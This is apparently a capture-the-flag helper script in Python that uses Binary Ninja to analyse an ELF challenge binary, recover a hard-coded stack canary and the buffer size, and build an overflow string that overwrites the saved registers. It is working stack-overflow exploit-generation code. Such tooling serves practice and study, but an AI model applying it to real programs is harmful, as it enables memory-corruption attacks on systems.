import binaryninja
import time
from binaryninja.enums import LowLevelILOperation
import base64

chal = "easy"
bv = binaryninja.BinaryViewType["ELF"].open(chal)
bv.update_analysis()
time.sleep(0.1)  # Bandaid for now

print("Entry Point: {0:x}".format(bv.entry_point))
entry = bv.entry_function # Get the entry point as a function object

count = 0
start = None
# Iterate over the basic blocks in the entry function
for block in entry.low_level_il:
    # Iterate over the basic blocks getting il instructions
    for il in block:
        # We only care about calls
        if il.operation != LowLevelILOperation.LLIL_CALL:
            continue
    
        # The second call is the call to start
        count += 1
        if count == 2:
            print(il)
            start = bv.get_functions_at(il.operands[0].value.value)[0]
            break

print("start: {0}".format(start))

# Do the same thing with main, it's the first call in start
main = None
for block in start.low_level_il:
    for il in block:
        if il.operation != LowLevelILOperation.LLIL_CALL:
            continue

        main = bv.get_functions_at(il.operands[0].value.value)[0]

print("main: {0}".format(main))

calls = []
for block in main.low_level_il:
    for il in block:
        if il.operation == LowLevelILOperation.LLIL_CALL:
            calls.append(il)

if len(calls) == 5:
    memcmp = calls[1]
    read_buf = calls[0]
else:
    memcmp = calls[2]
    read_buf = calls[1]

canary_frame = main.get_parameter_at(memcmp.address, None, 0, bv.arch)
canary_address = main.get_parameter_at(memcmp.address, None, 1, bv.arch )
canary_width = main.get_parameter_at(memcmp.address, None, 2, bv.arch)
canary = bv.read(canary_address.value, canary_width.value)
print("Canary: {0}".format(canary))

buffer_frame = main.get_parameter_at(read_buf.address, None, 0, bv.arch)    
# The canary is between the buffer and the saved stack registers
buffer_size = (buffer_frame.offset - canary_frame.offset) * -1
print("Buffer Size: {0} 0x{0:x}".format(buffer_size))

# Fill up the buffer
crash_string = "a" * buffer_size
# Append the first 4 bytes of the canary check (it's always 4)
crash_string += str(canary[:4])
    
# Pad out the rest of the string canary buffer
crash_string += "a" * ((canary_frame.offset * - 1) - 4)
    
# overwrite the saved registers
crash_string += 'eeee'
crash_string += '\n'
    
